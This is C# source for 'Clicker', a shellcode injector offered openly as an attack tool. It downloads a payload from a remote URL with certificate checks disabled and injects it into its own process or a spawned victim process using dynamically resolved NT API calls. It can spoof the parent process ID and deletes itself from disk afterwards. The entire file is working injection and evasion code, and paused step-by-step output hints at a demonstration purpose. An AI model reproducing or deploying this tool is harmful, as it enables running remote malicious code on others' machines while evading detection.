using DInvoke.DynamicInvoke;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

// Clicker.exe -u "https://192.168.231.128:9090/demon.bin" -t notepad -p 8972 -k

namespace Clicker
{
    internal class Program
    {
        public class Options
        {
            [OptionParameter(ShortName = 'u', DefaultValue = "")]
            public string Url { get; set; }

            [OptionParameter(ShortName = 't', DefaultValue = "")]
            public string Target { get; set; }

            [OptionParameter(ShortName = 'p', DefaultValue = 0)]
            public int Parent { get; set; }

            [OptionParameter(ShortName = 'k', DefaultValue = false)]
            public bool Kill { get; set; }

            [OptionParameter(ShortName = 'h', DefaultValue = false)]
            public bool Help { get; set; }
        }

        public static void banner()
        {
            Console.WriteLine(@"
       .:'                                  `:.
      ::'                                    `::
     :: :.                                  .: ::
      `:. `:.             .             .:'  .:'
       `::. `::           !           ::' .::'
           `::.`::.    .' ! `.    .::'.::'
             `:.  `::::'':!:``::::'   ::'
             :'*:::.  .:' ! `:.  .:::*`:
            :: HHH::.   ` ! '   .::HHH ::
           ::: `H TH::.  `!'  .::HT H' :::
           ::..  `THHH:`:   :':HHHT'  ..::
           `::      `T: `. .' :T'      ::'
             `:. .   :         :   . .:'
               `::'               `::'
                 :'  .`.  .  .'.  `:
                 :' ::.       .:: `:
                 :' `:::     :::' `:
                  `.  ``     ''  .'
                   :`...........':
                   ` :`.     .': '
                    `:  `""""""'  :'   Clicker
            ");
        }

        public static void help()
        {
            Console.WriteLine("Process Injector 2: Clicker (Nt*API)");
            Console.WriteLine("");
            Console.WriteLine("  -u, --url      Required. Remote URL address for raw shellcode.");
            Console.WriteLine("");
            Console.WriteLine("  -t, --target   Specify the target/victim process. Default: Self-injection");
            Console.WriteLine("");
            Console.WriteLine("  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)");
            Console.WriteLine("");
            Console.WriteLine("  -k, --kill     Enable self-destruct to auto wipe file from disk.");
            Console.WriteLine("");
            Console.WriteLine("  -h, --help     Display help screen manual.");
        }

        public static void display(string urlPath, string targetPath, int parentID, bool kill)
        {
            Console.WriteLine("|--------------");
            Console.WriteLine("| Payload       : " + urlPath);
            if (targetPath != "C:\\Windows\\System32\\.exe")
            {
                Console.WriteLine("| Process       : " + targetPath);
                if (parentID != 0)
                {
                    Console.WriteLine("| PPID Spoofing : " + parentID);
                }
            }
            if (kill)
            {
                Console.WriteLine("| Self Destruct : " + "True");
            }
            Console.WriteLine("|--------------");
            Console.WriteLine("");
        }

        public static void SelfDelete(string delay)
        {
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T " + delay + " & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static void spawnProcess(string targetPath, int parent, ref Win32.PROCESS_INFORMATION pi, ref Win32.STARTUPINFOEX si, ref IntPtr lpValue)
        {
            /* Process Attributes Initialization */

            const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

            si = new Win32.STARTUPINFOEX();
            pi = new Win32.PROCESS_INFORMATION();
            si.StartupInfo.cb = Marshal.SizeOf(si);

            var pa = new Win32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);
            var ta = new Win32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            lpValue = IntPtr.Zero;
            var fPtr = IntPtr.Zero;

            if (parent != 0)
            {
                /* Parent Process ID Spoofing */

                var lpSize = IntPtr.Zero;
                fPtr = Generic.GetLibraryAddress("kernel32.dll", "InitializeProcThreadAttributeList");
                Win32.InitializeProcThreadAttributeList fnInitializeProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.InitializeProcThreadAttributeList)) as Win32.InitializeProcThreadAttributeList;
                fnInitializeProcThreadAttributeList(
                    IntPtr.Zero,
                    1,
                    0,
                    ref lpSize);

                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                fnInitializeProcThreadAttributeList(
                    si.lpAttributeList,
                    1,
                    0,
                    ref lpSize);

                var phandle = IntPtr.Zero;

                try
                {
                    phandle = Process.GetProcessById(parent).Handle;
                }
                catch (Exception)
                {
                    Console.WriteLine("[-] Unable to open handle to Parent Process!");
                    Process.GetCurrentProcess().Kill();
                }

                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, phandle);

                fPtr = Generic.GetLibraryAddress("kernel32.dll", "UpdateProcThreadAttribute");
                Win32.UpdateProcThreadAttribute fnUpdateProcThreadAttribute = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.UpdateProcThreadAttribute)) as Win32.UpdateProcThreadAttribute;
                fnUpdateProcThreadAttribute(
                    si.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);

                /* Creating Target Process */

                object[] parameters =
                {
                    targetPath, null, pa, ta, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, "C:\\Windows\\System32", si, pi
                };

                pi = createProcess(parameters);
            }
            else
            {
                /* Creating Target Process (No PPID Spoofing) */

                object[] parameters =
                {
                    targetPath, null, pa, ta, false, (uint)0, IntPtr.Zero, "C:\\Windows\\System32", si, pi
                };

                pi = createProcess(parameters);
            }
        }

        public static Win32.PROCESS_INFORMATION createProcess(object[] parameters)
        {
            Console.WriteLine("[>] CreateProcessW()");

            var success = (bool)Generic.DynamicApiInvoke("kernel32.dll", "CreateProcessW", typeof(Win32.CreateProcessW), ref parameters);

            if (success)
            {
                Console.WriteLine("    |-> Target Process Created!");
            }
            else
            {
                Console.WriteLine("    |-> [X] Failed to create process. Error code: {0}", Marshal.GetLastWin32Error());
                Process.GetCurrentProcess().Kill();
            }

            var pi = (Win32.PROCESS_INFORMATION)parameters[9];

            return pi;
        }

        static async Task Main(string[] args)
        {
            /* Command Line Arguments Parsing */

            var options = CommandLineArgumentParser.Parse<Options>(args).ParsedOptions;
            var urlPath = options.Url;
            var targetPath = "C:\\Windows\\System32\\" + options.Target;
            if (!targetPath.Contains(".exe"))
            { targetPath += ".exe"; }

            /* Entry Point */

            banner();

            if (options.Help | (options.Url == "" && options.Target == "" && options.Parent == 0 && !options.Kill))
            {
                help();
            }
            else
            {
                display(urlPath, targetPath, options.Parent, options.Kill);

                /* Get Process PID & Handle */

                var pi = new Win32.PROCESS_INFORMATION();
                var si = new Win32.STARTUPINFOEX();
                IntPtr lpValue = IntPtr.Zero;
                var target = new Process();

                if (options.Target != "")
                {
                    spawnProcess(targetPath, options.Parent, ref pi, ref si, ref lpValue);
                    target = Process.GetProcessById(pi.dwProcessId);
                }
                else
                {
                    target = Process.GetCurrentProcess();
                    Console.WriteLine("[>] Self-Injecting");
                }

                Console.ReadKey();
                Console.WriteLine("    |-> PID: {0}", target.Id);

                /* Fetch Shellcode From Remote URL */

                byte[] shellcode = { };

                using (var handler = new HttpClientHandler())
                {
                    handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                    using (var client = new HttpClient(handler))
                    {
                        try
                        {
                            Console.WriteLine("");
                            Console.WriteLine("[>] Fetching Payload");
                            Console.ReadKey();
                            shellcode = await client.GetByteArrayAsync(urlPath);
                            Console.WriteLine("    |-> Payload retrieved successfully!");
                        }
                        catch
                        {
                            Console.WriteLine("    |-> [X] Something is wrong with URL address!");
                            Process.GetCurrentProcess().Kill();
                        }
                    }
                }

                /* Allocate Virtual Memory */

                Console.WriteLine("");
                Console.WriteLine(String.Format("[>] NtAllocateVirtualMemory()"));
                Console.ReadKey();

                var baseAddress = IntPtr.Zero;
                var regionSize = (IntPtr)shellcode.Length;
                var fPtr = Generic.GetLibraryAddress("ntdll.dll", "NtAllocateVirtualMemory");
                Win32.NtAllocateVirtualMemory fnNtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtAllocateVirtualMemory)) as Win32.NtAllocateVirtualMemory;
                var status = (Win32.NTSTATUS)fnNtAllocateVirtualMemory(
                    //pi.hProcess,
                    target.Handle,
                    ref baseAddress,
                    IntPtr.Zero,
                    ref regionSize,
                    Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                    Win32.MemoryProtection.ExecuteReadWrite);

                Console.WriteLine(String.Format("    |-> Base Address: 0x{0:X}", baseAddress.ToInt64()));

                /* Copying Shellcode Into Memory */

                Console.WriteLine("");
                Console.WriteLine("[>] NtWriteVirtualMemory()");
                Console.ReadKey();

                var buf = Marshal.AllocHGlobal(shellcode.Length);
                Marshal.Copy(shellcode, 0, buf, shellcode.Length);

                uint bytesWritten = 0;
                fPtr = Generic.GetLibraryAddress("ntdll.dll", "NtWriteVirtualMemory");
                Win32.NtWriteVirtualMemory fnNtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtWriteVirtualMemory)) as Win32.NtWriteVirtualMemory;
                status = (Win32.NTSTATUS)fnNtWriteVirtualMemory(
                    target.Handle,
                    baseAddress,
                    buf,
                    (uint)shellcode.Length,
                    ref bytesWritten);

                Console.WriteLine("    |-> Shellcode Injected!");

                /* Making Shellcode Executable (RX) */

                Console.WriteLine("");
                Console.WriteLine("[>] NtProtectVirtualMemory()");
                Console.ReadKey();

                var oldProtection = (Win32.MemoryProtection)0;
                regionSize = (IntPtr)shellcode.Length;
                fPtr = Generic.GetLibraryAddress("ntdll.dll", "NtProtectVirtualMemory");
                Win32.NtProtectVirtualMemory fnNtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtProtectVirtualMemory)) as Win32.NtProtectVirtualMemory;
                fnNtProtectVirtualMemory(
                    target.Handle,
                    ref baseAddress,
                    ref regionSize,
                    Win32.MemoryProtection.ExecuteRead,
                    ref oldProtection);

                Console.WriteLine("    |-> Flipping Memory Protection!");

                /* Start Thread In Process */

                Console.WriteLine("");
                Console.WriteLine("[>] NtCreateThreadEx()");
                Console.ReadKey();

                IntPtr threadHandle = IntPtr.Zero;
                fPtr = Generic.GetLibraryAddress("ntdll.dll", "NtCreateThreadEx");
                Win32.NtCreateThreadEx fnNtCreateThreadEx = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtCreateThreadEx)) as Win32.NtCreateThreadEx;
                fnNtCreateThreadEx(
                    ref threadHandle, 
                    0x0000FFFF | 0x001F0000, 
                    IntPtr.Zero, 
                    target.Handle, 
                    baseAddress, 
                    IntPtr.Zero, 
                    false, 
                    0, 
                    0, 
                    0, 
                    IntPtr.Zero);

                Console.WriteLine("    |-> Shellcode Executed!");

                /* Prevent Process Thread From Exiting (Self-Injection) */

                if (options.Target == "")
                {
                    const uint INFINITE = 0xFFFFFFFF;
                    fPtr = Generic.GetLibraryAddress("ntdll.dll", "NtWaitForSingleObject");
                    Win32.NtWaitForSingleObject fnNtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtWaitForSingleObject)) as Win32.NtWaitForSingleObject;

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtWaitForSingleObject()");
                    Console.WriteLine("    |-> Keeping Process Alive!");
                    fnNtWaitForSingleObject(threadHandle, false, Win32.LARGE_INTEGER.FromInt64(INFINITE));
                }

                /* Cleanup Leftover Artifacts */

                Console.ReadKey();

                if (si.lpAttributeList != IntPtr.Zero)
                {
                    fPtr = Generic.GetLibraryAddress("kernel32.dll", "DeleteProcThreadAttributeList");
                    Win32.DeleteProcThreadAttributeList fnDeleteProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.DeleteProcThreadAttributeList)) as Win32.DeleteProcThreadAttributeList;
                    fnDeleteProcThreadAttributeList(si.lpAttributeList);
                    Marshal.FreeHGlobal(si.lpAttributeList);
                    Marshal.FreeHGlobal(lpValue);
                    Console.WriteLine("");
                    Console.WriteLine("[>] DeleteProcThreadAttributeList()");
                    Console.WriteLine("    |-> Deleting Process Artifacts!");
                }

                // Closing Opened Handles

                fPtr = Generic.GetLibraryAddress("kernel32.dll", "CloseHandle");
                Win32.CloseHandle fnCloseHandle = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.CloseHandle)) as Win32.CloseHandle;

                if (pi.hProcess != IntPtr.Zero)
                {
                    fnCloseHandle(pi.hProcess);
                    Console.WriteLine("");
                    Console.WriteLine("[>] CloseHandle()");
                    Console.WriteLine("    |-> Closing Process Handle!");
                }
                if (pi.hThread != IntPtr.Zero)
                {
                    fnCloseHandle(pi.hThread);
                    Console.WriteLine("");
                    Console.WriteLine("[>] CloseHandle()");
                    Console.WriteLine("    |-> Closing Thread Handle!");
                }

                /* File Self-Destruct */

                if (options.Kill)
                {
                    SelfDelete("1");
                    Console.WriteLine("");
                    Console.WriteLine("[>] Clicker.exe removed from disk!");
                }
            }
        }
    }
}